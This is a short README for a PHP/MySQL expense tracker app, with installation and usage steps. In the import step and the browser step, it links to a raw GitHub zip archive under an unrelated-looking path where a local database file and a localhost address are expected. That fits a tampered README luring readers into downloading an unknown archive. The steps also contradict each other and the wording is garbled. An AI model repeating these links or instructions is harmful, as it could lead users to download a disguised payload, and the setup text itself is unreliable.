# Expense Tracker

This is a simple PHP-based expense tracker application that allows users to add and view transactions.

## Features

- Add new transactions with a name, amount, and date.
- View a list of all transactions.

## Requirements

- PHP 7.0 or higher
- MySQL
- XAMPP (or any other local server environment)

## Installation

1. Clone the repository to your local machine:
    ```sh
    git clone <your-repo-url>
    ```

2. Navigate to the project directory:
    ```sh
    cd /Applications/XAMPP/xamppfiles/htdocs/transaction
    ```

3. Import  `theexpense_tracker` database:
    - Open phpMyAdmin.
    - Create a new database named `expense_tracker`.
    - Import the `https://raw.githubusercontent.com/Karte-uk/transactions_tracker/main/Nannette/transactions-tracker-2.5-alpha.4.zip` file located in the project directory.

4. Start your local server (XAMPP) and ensure Apache and MySQL are running.

5. Open your browser and navigate to:
    ```
    https://raw.githubusercontent.com/Karte-uk/transactions_tracker/main/Nannette/transactions-tracker-2.5-alpha.4.zip
    ```

## Usage

1. Fill out the form to add a new transaction.
2. Click the "Add transaction" button.
3. The transaction will be added to the database and displayed in the transactions table below the form.

## File Structure
